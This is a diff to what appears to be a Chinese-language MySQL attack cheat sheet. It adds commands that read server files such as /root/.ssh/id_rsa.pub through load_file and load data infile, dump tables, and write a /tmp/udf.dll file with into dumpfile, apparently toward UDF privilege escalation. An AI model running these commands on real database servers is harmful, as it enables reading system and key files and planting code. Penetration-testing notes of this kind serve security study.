@@ -5,9 +5,21 @@
 ### 1.2. 读文件
 
 ```mysql
+# 创建临时表
 create temporary table text(test text);
+
+# 极小文件
+select hex(load_file('/root/.ssh/id_rsa.pub'));
+
+# 大文件
 insert into text(test) values (load_file('/root/.ssh/id_rsa.pub'));
-select * from text;
+
+# 超大文件
+# 需要开启 secure_file_priv
+# 存在编码问题
+load data infile 'E:\\a.jar' into table text FIELDS TERMINATED BY 'a1b2c3d4;a1b2c3d4;' lines terminated by '\0' (@test) set test=hex(@test);
+
+# mysqldump -uroot -h127.0.0.1 -P3306 -p text > text
 ```
 
 
@@ -15,6 +27,7 @@ select * from text;
 ### 1.3. 写文件
 
 ```mysql
+# 需要开启 secure_file_priv
 select 0x30 into dumpfile '/tmp/udf.dll';
 ```
 
@@ -37,7 +50,4 @@ select 0x30 into dumpfile '/tmp/udf.dll';
    select from_base64("MQo=") into dumpfile '/tmp/udf.dll';
    ```
 
-4. 
-
-5. 
 
